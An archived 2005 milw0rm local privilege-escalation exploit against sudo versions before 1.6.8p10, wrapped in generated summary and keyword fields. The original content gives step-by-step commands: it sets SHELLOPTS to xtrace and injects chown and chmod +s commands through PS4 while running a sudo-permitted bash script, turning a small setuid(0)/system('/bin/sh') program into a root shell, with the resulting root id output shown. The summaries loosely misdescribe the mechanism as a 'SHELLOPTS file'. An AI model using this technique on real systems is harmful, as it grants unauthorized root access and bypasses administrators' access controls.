@@ -1,0 +1,75 @@
+#<-- Publish Date -->#
+2005-11-09
+
+#<-- Technical Document Summary (TDS) -->#
+The exploit leverages a vulnerability in the SHELLOPTS environment variable handling of sudo on Linux systems. By manipulating the SHELLOPTS file, an attacker can execute arbitrary commands as root without authentication. This mechanism allows privilege escalation through a local root escalation flaw in sudo's configuration management.
+
+#<-- Layman's Document Summary (LDS) -->#
+An attacker with sudo access can modify environment variables to gain unauthorized root privileges on a Linux system. The issue stems from improper handling of the SHELLOPTS file within the sudo configuration process, enabling command execution as the root user without additional credentials.
+
+#<-- Key Words (KW) -->#
+sudo, SHELLOPTS, privilege escalation, local root, vulnerability, environment variable, csh shell, egg.c, setuid, system("/bin/sh"), sudoers, file permissions
+
+#<-- Related Terms -->#
+Sudo, Shell, Environment Variables, Privilege Escalation, Root Access, Linux, Vulnerability, Command Execution, Configuration Management
+
+#<-- Entities/Attributes -->#
+Product: Sudo Version: 1.6.8p9 Affected Component: SHELLOPTS file Local OS: Linux Function: setuid System: /bin/sh
+
+#<-- Vulnerability Type -->#
+Not specified in source
+
+#<-- Original Content -->#
+
+## Sudo local root escalation privilege ##
+## vuln versions :  sudo < 1.6.8p10
+## by breno
+
+## You need sudo access execution for some bash script ##
+## Use csh shell to change SHELLOPTS env ##
+
+ie:
+       %cat x.sh
+       #!/bin/bash -x
+
+       echo "Getting root!!"
+       %
+##
+
+##
+       # cat /etc/sudoers
+       ...
+       breno   ALL=(ALL) /home/breno/x.sh
+       ..
+       #
+
+## Let's use an egg shell :)
+       %cat egg.c
+
+#include <stdio.h>
+
+       int main()
+       {
+       setuid(0);
+       system("/bin/sh");
+}
+%
+
+% gcc -o egg egg.c
+% setenv SHELLOPTS xtrace
+% setenv PS4 '$(chown root:root egg)'
+% sudo ./x.sh
+echo Getting root!!
+Getting root!!
+% ls -lisa egg
+1198941 8 -rwxr-xr-x  1 root root 7428 2005-11-09 13:54 egg
+% setenv PS4 '$(chmod +s egg)'
+% sudo ./x.sh
+echo Getting root!!
+Getting root!!
+% ./egg
+sh-3.00# id
+uid=0(root) gid=1000(breno) egid=0(root) grupos=7(lp),102(lpadmin),1000(breno)
+sh-3.00#
+
+# milw0rm.com [2005-11-09]
